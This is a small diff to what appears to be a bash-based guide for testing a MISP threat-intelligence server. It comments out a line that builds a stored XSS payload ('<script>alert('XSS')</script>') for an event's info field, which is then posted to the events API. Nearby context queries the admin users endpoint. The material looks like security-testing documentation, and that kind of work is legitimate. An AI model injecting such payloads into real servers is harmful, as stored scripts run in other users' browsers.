@@ -85,7 +85,7 @@ curl -s https://misp.example.com/admin/users/index "${HEADERS[@]}" | jq '.[].Use
 ```bash
 # Inject XSS payload in event report
 # Payload stored in event.info field, executed when viewed
-EVENT_DATA='{"Event":{"info":"<script>alert(\'XSS\')</script>","distribution":0}}'
+# EVENT_DATA='{"Event":{"info":"<script>alert(\'XSS\')</script>","distribution":0}}'
 
 curl -s -X POST https://misp.example.com/events/add \
   -H "Authorization: $API_KEY" \
